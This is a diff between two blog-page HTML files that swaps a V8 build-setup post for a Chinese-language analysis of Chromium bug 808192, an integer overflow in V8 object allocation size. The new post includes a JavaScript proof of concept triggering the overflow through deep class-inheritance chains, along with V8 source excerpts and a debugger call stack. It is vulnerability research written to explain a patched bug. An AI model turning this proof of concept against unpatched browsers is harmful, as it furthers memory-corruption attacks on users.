@@ -10,8 +10,8 @@
   <meta charset="UTF-8"/>
 <script>
     (function(){
-        if('czsgmm'){
-            if (prompt('请输入文章密码') !== 'czsgmm'){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
                 alert('密码错误');
                 history.back();
             }
@@ -78,7 +78,7 @@
 
 
 
-  <meta name="keywords" content="Browser Explore," />
+  <meta name="keywords" content="Hexo, NexT" />
 
 
 
@@ -91,18 +91,22 @@
 
 
 
-<meta name="description" content="Pre WorkInstall Git 1apt-get install git Install depot_tools 12git clone https://chromium.googlesource.com/chromium/tools/depot_toolsexport PATH=`pwd`/depot_tools:&amp;quot;$PATH&amp;quot;">
-<meta name="keywords" content="Browser Explore">
+<meta name="description" content="Security: V8 Integer overflow in object allocation sizereferencehttps://bugs.chromium.org/p/chromium/issues/detail?id=808192https://chromium.googlesource.com/v8/v8/+/7b27040e66c8a83006aebc90fe97d21bb4">
 <meta property="og:type" content="article">
-<meta property="og:title" content="V8 Environmental Configuration">
-<meta property="og:url" content="http://p1umer.club/2018/07/01/V8-Environmental-Configuration/index.html">
+<meta property="og:title" content="Analysis of 45584">
+<meta property="og:url" content="http://p1umer.club/2018/07/12/Analysis-of-45584/index.html">
 <meta property="og:site_name" content="P1umerのblog">
-<meta property="og:description" content="Pre WorkInstall Git 1apt-get install git Install depot_tools 12git clone https://chromium.googlesource.com/chromium/tools/depot_toolsexport PATH=`pwd`/depot_tools:&amp;quot;$PATH&amp;quot;">
+<meta property="og:description" content="Security: V8 Integer overflow in object allocation sizereferencehttps://bugs.chromium.org/p/chromium/issues/detail?id=808192https://chromium.googlesource.com/v8/v8/+/7b27040e66c8a83006aebc90fe97d21bb4">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-07-03T16:02:25.632Z">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/blog/180712/G4Hf5e6kdb.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/blog/180712/dlcLhK2H4D.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/blog/180712/Ek5c5eLFc6.png">
+<meta property="og:image" content="http://onc55v8te.bkt.clouddn.com/blog/180712/gCib10LF23.png">
+<meta property="og:updated_time" content="2018-07-11T18:30:46.023Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="V8 Environmental Configuration">
-<meta name="twitter:description" content="Pre WorkInstall Git 1apt-get install git Install depot_tools 12git clone https://chromium.googlesource.com/chromium/tools/depot_toolsexport PATH=`pwd`/depot_tools:&amp;quot;$PATH&amp;quot;">
+<meta name="twitter:title" content="Analysis of 45584">
+<meta name="twitter:description" content="Security: V8 Integer overflow in object allocation sizereferencehttps://bugs.chromium.org/p/chromium/issues/detail?id=808192https://chromium.googlesource.com/v8/v8/+/7b27040e66c8a83006aebc90fe97d21bb4">
+<meta name="twitter:image" content="http://onc55v8te.bkt.clouddn.com/blog/180712/G4Hf5e6kdb.png">
 
 
 
@@ -132,13 +136,13 @@
 
 
 
-  <link rel="canonical" href="http://p1umer.club/2018/07/01/V8-Environmental-Configuration/"/>
+  <link rel="canonical" href="http://p1umer.club/2018/07/12/Analysis-of-45584/"/>
 
 
 
 
 
-  <title>V8 Environmental Configuration | P1umerのblog</title>
+  <title>Analysis of 45584 | P1umerのblog</title>
   
 
 
@@ -275,7 +279,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://p1umer.club/2018/07/01/V8-Environmental-Configuration/">
+    <link itemprop="mainEntityOfPage" href="http://p1umer.club/2018/07/12/Analysis-of-45584/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="P1umer sauce">
@@ -292,7 +296,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">V8 Environmental Configuration</h1>
+          <h1 class="post-title" itemprop="name headline">Analysis of 45584</h1>
         
 
         <div class="post-meta">
@@ -304,8 +308,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-01T17:35:44+08:00">
-                2018-07-01
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-12T02:21:26+08:00">
+                2018-07-12
               </time>
             
 
@@ -314,39 +318,6 @@
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Browser-Explore/" itemprop="url" rel="index">
-                    <span itemprop="name">Browser Explore</span>
-                  </a>
-                </span>
-
-                
-                
-                  ， 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Browser-Explore/V8/" itemprop="url" rel="index">
-                    <span itemprop="name">V8</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -369,7 +340,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  170
+                  570
                 </span>
               
 
@@ -385,7 +356,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  1
+                  3
                 </span>
               
             </div>
@@ -406,14 +377,21 @@
       
 
       
-        <h2 id="Pre-Work"><a href="#Pre-Work" class="headerlink" title="Pre Work"></a>Pre Work</h2><h3 id="Install-Git"><a href="#Install-Git" class="headerlink" title="Install Git"></a>Install Git</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install git</span><br></pre></td></tr></table></figure>
-<h3 id="Install-depot-tools"><a href="#Install-depot-tools" class="headerlink" title="Install depot_tools"></a>Install depot_tools</h3> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools</span><br><span class="line">export PATH=`pwd`/depot_tools:&quot;$PATH&quot;</span><br></pre></td></tr></table></figure>
- <a id="more"></a>
-<h3 id="外网配置"><a href="#外网配置" class="headerlink" title="外网配置"></a>外网配置</h3><pre><code>原谅我之前没有用到过终端代理...
-不过通过sstap解决了代理问题：[SSTap](https://www.sockscap64.com/zh-hans/sstap/)能在网络层拦截所有连接并转发给HTTP，SOCKS4，5，SHADOWSOCKS代理。是一种硬核的全局代理。
-&amp;nbsp;
-</code></pre><h2 id="Key-Step"><a href="#Key-Step" class="headerlink" title="Key Step"></a>Key Step</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gclient</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">-</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure>
-<p>此时编译的是最新版本的v8<br>若想切换分支，在(-)处执行以下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard +hash</span><br><span class="line">tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C out.gn/x64.debug</span><br></pre></td></tr></table></figure></p>
+        <h2 id="Security-V8-Integer-overflow-in-object-allocation-size"><a href="#Security-V8-Integer-overflow-in-object-allocation-size" class="headerlink" title="Security: V8 Integer overflow in object allocation size"></a>Security: V8 Integer overflow in object allocation size</h2><h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://bugs.chromium.org/p/chromium/issues/detail?id=808192" target="_blank" rel="noopener">https://bugs.chromium.org/p/chromium/issues/detail?id=808192</a><br><a href="https://chromium.googlesource.com/v8/v8/+/7b27040e66c8a83006aebc90fe97d21bb42156a7" target="_blank" rel="noopener">https://chromium.googlesource.com/v8/v8/+/7b27040e66c8a83006aebc90fe97d21bb42156a7</a></p>
+<h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> f = <span class="built_in">eval</span>(<span class="string">`(function f(i) &#123;</span></span><br><span class="line"><span class="string">	if (i == 0) &#123;</span></span><br><span class="line"><span class="string">		class Derived extends Object &#123;</span></span><br><span class="line"><span class="string">			constructor() &#123;</span></span><br><span class="line"><span class="string">				super();</span></span><br><span class="line"><span class="string">				<span class="subst">$&#123;<span class="string">"this.a=1;"</span>.repeat(<span class="number">0x3fffe</span><span class="number">-8</span>)&#125;</span></span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		return Derived;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	class DerivedN extends f(i-1) &#123;</span></span><br><span class="line"><span class="string">		constructor() &#123;</span></span><br><span class="line"><span class="string">			super();</span></span><br><span class="line"><span class="string">			<span class="subst">$&#123;<span class="string">"this.a=1;"</span>.repeat(<span class="number">0x40000</span><span class="number">-8</span>)&#125;</span></span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	return DerivedN;</span></span><br><span class="line"><span class="string">&#125;)`</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a = <span class="keyword">new</span> (f(<span class="number">0x7ff</span>))();</span><br><span class="line"><span class="built_in">console</span>.log(a);</span><br><span class="line"></span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>body&gt;</span><br><span class="line">&lt;<span class="regexp">/html&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><p>PoC中prototype chain递归增长<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expected_nof_properties += shared-&gt;expected_nof_properties(); <span class="comment">// &lt;--- overflow here!</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*instance_size =</span><br><span class="line">    Min(header_size +</span><br><span class="line">            ((requested_embedder_fields + requested_in_object_properties)</span><br><span class="line">             &lt;&lt; kPointerSizeLog2),</span><br><span class="line">        JSObject::kMaxInstanceSize); <span class="comment">//&lt;---分配给对象的大小溢出</span></span><br></pre></td></tr></table></figure>
+<p>keypoint:分配object的时候把原型链上的属性全部带上，在计算原型链属性sum的时候出现了整数溢出错误.<br><img src="http://onc55v8te.bkt.clouddn.com/blog/180712/G4Hf5e6kdb.png" alt="mark">)<br>其中iter是PrototypeIterator类型的迭代器，用来作用于原型链的回溯。<br>JSFunction继承关系如下：<br><img src="http://onc55v8te.bkt.clouddn.com/blog/180712/dlcLhK2H4D.png" alt="mark"><br>内部结构：<br><img src="http://onc55v8te.bkt.clouddn.com/blog/180712/Ek5c5eLFc6.png" alt="mark"><br>JSFunction类有个shared字段，它指向一个SharedFunctionInfo实例，该类主要是存储JSFunction实例中一些共同的内容。<br><img src="http://onc55v8te.bkt.clouddn.com/blog/180712/gCib10LF23.png" alt="mark"><br>当shared的function是compiled时，那么执行expected_nof_properties的累加操作，该局部变量累积了所有的expected_nof_properties(非局部变量)。原型链中的属性过多则会造成整数溢出。</p>
+<h3 id="Others"><a href="#Others" class="headerlink" title="Others"></a>Others</h3><ol>
+<li><p>对象创建</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> 1      v8.dll!v8::internal::JSFunction::CalculateInstanceSizeForDerivedClass(v8::internal::Handle&lt;v8::internal::JSFunction&gt; function, v8::internal::InstanceType instance_type, int requested_embedder_fields, int * instance_size, int * in_object_properties)</span><br><span class="line"> 2      v8.dll!v8::internal::JSFunction::GetDerivedMap(v8::internal::Isolate * isolate, v8::internal::Handle&lt;v8::internal::JSFunction&gt; constructor, v8::internal::Handle&lt;v8::internal::JSReceiver&gt; new_target)</span><br><span class="line"> 3      v8.dll!v8::internal::JSObject::New(v8::internal::Handle&lt;v8::internal::JSFunction&gt; constructor, v8::internal::Handle&lt;v8::internal::JSReceiver&gt; new_target, v8::internal::Handle&lt;v8::internal::AllocationSite&gt; site) &lt;&lt;-----new</span><br><span class="line"> 4      v8.dll!v8::internal::__RT_impl_Runtime_NewObject(v8::internal::Arguments args, v8::internal::Isolate * isolate)</span><br><span class="line">*5      v8.dll!v8::internal::Runtime_NewObject(int args_length, v8::internal::Object * * args_object, v8::internal::Isolate * isolate)</span><br><span class="line"> 6      [外部代码]</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>initial_map</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   Handle&lt;Map&gt; initial_map;</span><br><span class="line">  ASSIGN_RETURN_ON_EXCEPTION(</span><br><span class="line">      isolate, initial_map,</span><br><span class="line">      JSFunction::GetDerivedMap(isolate, constructor, new_target), JSObject);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">if</span> (*new_target == *constructor) <span class="keyword">return</span> constructor_initial_map;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:(fast path)</span><br><span class="line"> <span class="comment">// Fast case, new.target is a subclass of constructor. The map is cacheable</span></span><br><span class="line">  <span class="comment">// (and may already have been cached). new.target.prototype is guaranteed to</span></span><br><span class="line">  <span class="comment">// be a JSReceiver.</span></span><br><span class="line">  <span class="keyword">if</span> (new_target-&gt;IsJSFunction()) &#123;</span><br><span class="line">    Handle&lt;JSFunction&gt; function = Handle&lt;JSFunction&gt;::cast(new_target);</span><br><span class="line">    <span class="keyword">if</span> (FastInitializeDerivedMap(isolate, function, constructor,&lt;&lt;----Fast path</span><br><span class="line">                                 constructor_initial_map)) &#123;</span><br><span class="line">      <span class="keyword">return</span> handle(function-&gt;initial_map(), isolate);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>3.expected_nof_properties<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// [expected_nof_properties]: Expected number of properties for the</span><br><span class="line">// function. The value is only reliable when the function has been compiled.</span><br><span class="line">DECL_INT_ACCESSORS(expected_nof_properties)</span><br></pre></td></tr></table></figure></p>
+<h3 id="pattern"><a href="#pattern" class="headerlink" title="pattern"></a>pattern</h3><p>计算数值用作内存分配，但是未对计算中间值检查。</p>
 
       
     </div>
@@ -429,12 +407,6 @@
 
     <footer class="post-footer">
       
-        <div class="post-tags">
-          
-            <a href="/tags/Browser-Explore/" rel="tag"><i class="fa fa-tag"></i> Browser Explore</a>
-          
-        </div>
-      
 
       
       
@@ -444,8 +416,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/06/30/Review-of-DoubleFree/" rel="next" title="Review of  DoubleFree">
-                <i class="fa fa-chevron-left"></i> Review of  DoubleFree
+              <a href="/2018/07/01/V8-Environmental-Configuration/" rel="next" title="V8 Environmental Configuration">
+                <i class="fa fa-chevron-left"></i> V8 Environmental Configuration
               </a>
             
           </div>
@@ -454,8 +426,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2018/07/12/Analysis-of-45584/" rel="prev" title="Analysis of 45584">
-                Analysis of 45584 <i class="fa fa-chevron-right"></i>
+              <a href="/2018/07/17/“主人要闭关”/" rel="prev" title="“主人要闭关”">
+                “主人要闭关” <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -641,7 +613,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Pre-Work"><span class="nav-number">1.</span> <span class="nav-text">Pre Work</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Install-Git"><span class="nav-number">1.1.</span> <span class="nav-text">Install Git</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Install-depot-tools"><span class="nav-number">1.2.</span> <span class="nav-text">Install depot_tools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#外网配置"><span class="nav-number">1.3.</span> <span class="nav-text">外网配置</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Key-Step"><span class="nav-number">2.</span> <span class="nav-text">Key Step</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Security-V8-Integer-overflow-in-object-allocation-size"><span class="nav-number">1.</span> <span class="nav-text">Security: V8 Integer overflow in object allocation size</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#reference"><span class="nav-number">1.1.</span> <span class="nav-text">reference</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PoC"><span class="nav-number">1.2.</span> <span class="nav-text">PoC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-number">1.3.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Others"><span class="nav-number">1.4.</span> <span class="nav-text">Others</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pattern"><span class="nav-number">1.5.</span> <span class="nav-text">pattern</span></a></li></ol></li></ol></div>
             
 
           </div>
